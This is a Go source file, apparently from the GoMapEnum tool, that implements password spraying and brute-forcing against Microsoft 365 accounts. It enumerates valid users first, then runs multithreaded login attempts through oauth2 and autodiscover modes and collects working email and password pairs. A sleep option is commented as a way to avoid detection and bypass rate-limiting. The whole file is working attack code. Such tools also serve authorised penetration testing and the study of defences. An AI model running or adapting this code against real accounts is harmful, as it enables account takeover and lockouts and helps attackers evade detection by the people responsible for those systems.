package o365

import (
	"GoMapEnum/src/logger"
	"GoMapEnum/src/utils"
	"errors"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Brute will bruteforce or spray passwords on the specified users.
func (options *Options) Brute() []string {
	var emailList []string
	var wg sync.WaitGroup
	var validUsers []string
	mux := &sync.Mutex{}
	var nbLockout = 0
	if options.CheckIfValid {
		options.Log.Debug("Validating the users")
		optionsEnum := *options
		var tmpLogger logger.Logger
		// Use office for enumeration (safer)
		optionsEnum.Mode = "office"
		optionsEnum.Log = &tmpLogger
		*optionsEnum.Log = *options.Log
		optionsEnum.Log.Type = "Enumeration"
		// If debug or verbose use this level in userenum module otherwise do not show the valid user
		if options.Log.Level == logger.DebugLevel || options.Log.Level == logger.VerboseLevel {
			optionsEnum.Log.Level = options.Log.Level
		} else {
			optionsEnum.Log.Level = logger.ErrorLevel
		}
		emailList = (&optionsEnum).UserEnum()
	} else {
		options.Users = utils.GetStringOrFile(options.Users)
		emailList = strings.Split(options.Users, "\n")
	}
	options.Passwords = utils.GetStringOrFile(options.Passwords)
	passwordList := strings.Split(options.Passwords, "\n")

	queue := make(chan string)
	for i := 0; i < options.Thread; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			var j = 0
			for email := range queue {

				if options.Sleep != 0 {
					// Sleep to avoid detection and bypass rate-limiting
					options.Log.Debug("Sleep " + strconv.Itoa(options.Sleep) + " seconds")
					time.Sleep(time.Duration(options.Sleep) * time.Second)
				}
				if options.NoBruteforce {
					if options.authenticate(email, passwordList[j], &nbLockout) {
						mux.Lock()
						validUsers = append(validUsers, email+" / "+passwordList[j])
						mux.Unlock()
					}
				} else {
					for _, password := range passwordList {
						if options.authenticate(email, password, &nbLockout) {
							mux.Lock()
							validUsers = append(validUsers, email+" / "+password)
							mux.Unlock()
							break // No need to continue if password is valid
						}
					}
				}
				j++
			}

		}(i)
	}
	// Trim emails and send them to the pool of workers
	for _, email := range emailList {
		email = strings.ToValidUTF8(email, "")
		email = strings.Trim(email, "\r")
		email = strings.Trim(email, "\n")
		queue <- email
	}

	close(queue)
	wg.Wait()
	return validUsers

}

// brute will be called to test an authentication and use the specified mode and check the lockout
func (options *Options) authenticate(email, password string, nbLockout *int) bool {
	var valid bool
	var err error
	switch options.Mode {
	case "oauth2":
		valid, err = options.bruteOauth2(email, password)
		if err != nil && errors.Is(utils.ErrLockout, err) {
			*nbLockout++
		}
		// Fail safe to avoid locking to many account
		if *nbLockout >= options.LockoutThreshold {
			options.Log.Fatal("Too many lockout: " + strconv.Itoa(*nbLockout) + " >= " + strconv.Itoa(options.LockoutThreshold))
		}

	case "autodiscover":
		// We have no information on account lockout
		valid = bruteAutodiscover(email, password)
	}

	return valid
}
